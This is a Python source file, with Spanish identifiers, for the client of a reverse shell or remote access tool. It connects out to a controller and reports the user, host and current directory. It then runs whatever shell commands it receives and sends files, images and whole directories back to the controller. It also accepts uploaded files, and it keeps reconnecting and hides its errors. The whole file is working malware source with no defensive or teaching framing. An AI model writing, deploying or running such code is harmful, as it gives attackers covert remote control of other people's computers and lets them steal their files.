import socket
import os
import getpass
import re
import pickle
import struct
from time import sleep
from subprocess import Popen, PIPE

class TCP:
    def __init__(self, host, port):
        self.__host = host
        self.__port = port

    def conectar(self):
        while True:
            try:
                self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                self.__sock.connect((self.__host, self.__port))
                self.__chunk = int(self.__sock.recv(1024).decode())

                sleep(0.05)
                userName = getpass.getuser()
                hostName = socket.gethostname()
                currentDir = os.getcwd()
                info = userName + '\n' + hostName + '\n' + currentDir
                self.__sock.send(info.encode())

                break

            except:
                sleep(5)

    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    def isImage(self, ubicacion):
        ext = [".jpg", ".png", ".jpeg", ".webp"]
        imagen = False
        for i in ext:
            if ubicacion.lower().endswith(i):
                imagen = True
                break

        return imagen

    def enviarDatos(self, info):
        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        self.__sock.sendall(info)

    def enviarArchivo(self, ubicacion):
        sleep(0.05)
        tam = os.path.getsize(ubicacion)
        paquetes = str(int(tam/self.__chunk))
        self.__sock.send(paquetes.encode())

        sleep(0.05)
        with open(ubicacion, 'rb') as archivo:
            info = archivo.read(self.__chunk)
            while info:
                self.__sock.send(info)
                info = archivo.read(self.__chunk)
                sleep(0.05)
        archivo.close()

    def recibirArchivo(self, ubicacion):
        with open(ubicacion, 'wb') as archivo:
            while True:
                info = self.__sock.recv(self.__chunk)
                archivo.write(info)

                if len(info) < self.__chunk:
                    break
        archivo.close()

    def enviarDirectorio(self, origen, index):
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                archivos.append(archivo)

        sleep(0.2)
        tam = len(archivos)
        if index > tam:
            index = 1
        self.__sock.send(str(tam).encode())

        while index <= tam:
            nombre = self.getNombre(archivos[index-1])
            peso = os.path.getsize(archivos[index-1])
            paquetes = str(int(peso/self.__chunk))
            info = nombre + '\n' + paquetes
            sleep(0.1)
            self.__sock.send(info.encode())

            res = self.__sock.recv(1024).decode()
            if res == 'S':
                self.enviarArchivo(archivos[index-1])
            elif res == "quit":
                break
            else:
                pass

            index += 1
            sleep(0.05)

    def recibirDirectorio(self, destino, index):
        if not os.path.isdir(destino):
            os.mkdir(destino)

        tam = int(self.__sock.recv(1024).decode())

        if index > tam:
            index = 1
        while index <= tam:
            res = self.__sock.recv(1024).decode()

            if res == 'S':
                nombre = self.__sock.recv(1024).decode()
                self.recibirArchivo(f"{destino}/{nombre}")
            elif res == "quit":
                break
            else:
                pass

            index += 1

    def cd(self, directorio):
        if os.path.isdir(directorio):
            os.chdir(directorio)
            self.__sock.send(os.getcwd().encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    def sendFileFrom(self, cmd):
        if re.search("-d", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                nombre = self.getNombre(origen)

                sleep(0.05)
                self.__sock.send(nombre.encode())
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    def sendFileTo(self, cmd):
        if re.search("-d", cmd):
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            self.recibirArchivo(destino)

        else:
            destino = self.__sock.recv(1024).decode()
            self.recibirArchivo(destino)

    def image(self, cmd):
        if re.search("-t", cmd):
            imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
        else:
            imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

        if os.path.isfile(imagen) and self.isImage(imagen):
            self.__sock.send("ok".encode())
            sleep(0.05)
            nombre = self.getNombre(imagen)
            self.__sock.send(nombre.encode())

            archivo = open(imagen, 'rb')
            info = archivo.read()
            archivo.close()

            sleep(0.05)
            self.enviarDatos(info)

        else:
            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())

    def sendDirFrom(self, cmd):
        if re.search("-d", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            if re.search("-i", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            if os.path.isdir(origen):
                self.__sock.send("ok".encode())
                self.enviarDirectorio(origen, index)

            else:
                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())

        else:
            if re.search("-i", cmd):
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            if os.path.isdir(origen):
                self.__sock.send("ok".encode())
                sleep(0.05)
                self.__sock.send(self.getNombre(origen).encode())
                self.enviarDirectorio(origen, index)

            else:
                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())

    def sendDirTo(self, cmd):
        try:
            if re.search("-d", cmd):
                if re.search("-i", cmd):
                    destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                    index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                    if index <= 0:
                        index = 1
                else:
                    destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                    index = 1

                self.recibirDirectorio(destino, index)

            else:
                if re.search("-i", cmd):
                    index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                    if index <= 0:
                        index = 1
                else:
                    index = 1

                destino = self.__sock.recv(1024).decode()
                self.recibirDirectorio(destino, index)

        except Exception as e:
            print(e)

    def shell(self):
        try:
            while True:
                cmd = self.__sock.recv(1024).decode()

                if cmd.lower() == "exit":
                    try:
                        self.__sock.close()
                        break

                    except:
                        continue

                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        self.__sock.close()
                        self.conectar()

                    except:
                        continue

                elif cmd.lower()[:2] == "cd":
                    try:
                        self.cd(cmd[3:])

                    except:
                        continue

                elif cmd.lower()[:3] == "sff":
                    try:
                        self.sendFileFrom(cmd)

                    except:
                        continue

                elif cmd.lower()[:3] == "sft":
                    try:
                        self.sendFileTo(cmd)

                    except:
                        continue

                elif cmd.lower()[:3] == "img":
                    try:
                        self.image(cmd)

                    except:
                        continue

                elif cmd.lower()[:3] == "sdf":
                    try:
                        self.sendDirFrom(cmd)

                    except:
                        continue

                elif cmd.lower()[:3] == "sdt":
                    try:
                        self.sendDirTo(cmd)

                    except:
                        continue

                else:
                    try:
                        comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                        info = comando.stdout.read() + comando.stderr.read()

                        if info == b'':
                            self.__sock.send("[+] Comando ejecutado".encode())

                        else:
                            i = 0
                            while i < len(info):
                                self.__sock.send(info[i:i+self.__chunk])
                                i += self.__chunk

                    except:
                        continue

        except:
            self.conectar()
